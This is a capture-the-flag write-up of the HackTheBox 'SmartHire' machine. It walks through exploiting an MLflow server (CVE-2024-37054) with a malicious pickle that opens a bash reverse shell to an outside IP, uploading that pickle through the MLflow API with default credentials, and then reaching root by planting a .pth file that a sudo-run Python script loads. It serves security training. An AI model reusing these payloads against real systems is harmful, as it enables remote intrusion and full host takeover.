# HackTheBox SmartHire Full Chain Penetration Testing

## External Reconnaissance and Web Entry

- Network Mapping:
  - nmap scan of `10.129.245.215` identified open ports: `22`, `80`.
- Web reconnaissance:
  - Virtual host discovery revealed `models.smarthire.htb`.
  - Accessing the vhost returned `401 Unauthorized` with `WWW-Authenticate: Basic realm="mlflow"`, confirming MLflow as the backend application.
- Authentication:
  - Default MLflow credentials were accepted, providing access to the application API.

## MLflow Exploitation

- Version Identification:
  - The MLflow instance was running version 2.14.1.
- Vulnerability Analysis:
  - MLflow 2.14.1 was identified as vulnerable to CVE-2024-37054.
  - The vulnerability allows Remote Code Execution (RCE) through unsafe deserialization of malicious Pickle-based model artifacts.
- Payload Generation:
  - A malicious `python_model.pkl` file was created using Python's pickle module and the __reduce__ method to execute a system command during deserialization.

## Malicious Model Generation

```python
import pickle

cmd = "bash -c 'bash -i >& /dev/tcp/10.10.15.12/4444 0>&1'"

class Pwn:
    def __reduce__(self):
        import os
        return (os.system, (cmd,))

with open("python_model.pkl","wb") as f:
    pickle.dump(Pwn(), f)
```
- The payload executes a Bash reverse shell connecting back to 10.10.15.12:4444.

## MLflow API Enumeration

- Registered models were enumerated using the MLflow API:
```bash
curl -u admin:password \
'http://models.smarthire.htb/api/2.0/mlflow/registered-models/search'
```
- The response revealed an existing model:
  - root-e172cd5f771b-model
  - Version: 1
  - Run ID: 38dc91da55a1429081a920b2ee88c12a
- The model artifact location was identified as:
  - `mlflow-artifacts:/0/38dc91da55a1429081a920b2ee88c12a/artifacts/model`

## Payload Delivery and Reverse Shell

- The existing python_model.pkl artifact was overwritten with the malicious model:
```bash
curl -u admin:password -X PUT \
--data-binary @python_model.pkl \
"http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/38dc91da55a1429081a920b2ee88c12a/artifacts/model/python_model.pkl"
```
- A subsequent application request triggered model loading and deserialization.
- The malicious Pickle payload was executed, resulting in a reverse shell.
- Initial access was obtained as:
  - svcweb
- A stable SSH session was established using SSH key authentication.

## Privilege Escalation (svcweb -> root)

- Sudo enumeration:

`sudo -l`

- The following rule was identified:

`(root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *`

- This allowed svcweb to execute `/opt/tools/mlflow_ctl/mlflowctl.py` as root without authentication.

## Python Plugin Path Enumeration

- Examination of `/opt/tools/mlflow_ctl/mlflowctl.py` revealed dynamic plugin loading:
```python
BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))
```
- The script dynamically adds every subdirectory of plugins to Python's module search path.
- The directory structure was examined:

`ls -la /opt/tools/mlflow_ctl/plugins`

- The following directory was writable by the devs group:

`drwxrwxr-x 2 root devs ... dev`

- Current group membership:
```bash
id

uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
```
- Since svcweb is a member of devs, the user had write access to:

`/opt/tools/mlflow_ctl/plugins/dev`

## Privilege Escalation via Python .pth

- Python's site.addsitedir() processes .pth files located in the added directory.
- .pth files can contain executable Python statements on lines beginning with import.
- A malicious .pth file was created inside the writable plugin directory:
```python
printf 'import os; os.system("id > /tmp/pth-test")\n' \
> /opt/tools/mlflow_ctl/plugins/dev/test.pth
```
- The vulnerable script was then executed with sudo:
```bash
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```
- The command from the .pth file was executed in the context of the sudo process.
- The resulting /tmp/pth-test contained:

`uid=0(root) gid=0(root)`

- This confirmed arbitrary code execution as root.

## Root Shell
The same .pth execution primitive was used to execute a reverse shell command as root.
## Key Takeaways

- MLflow installations should be checked for exposed management APIs and weak/default credentials.
- When investigating MLflow, enumerate registered models and artifact locations.
- Pickle-based model formats can introduce arbitrary code execution when untrusted artifacts are deserialized.
- For sudo rules involving Python, inspect imports, plugin mechanisms and dynamically added paths.
- site.addsitedir() combined with a writable directory should immediately raise the possibility of .pth-based code execution.
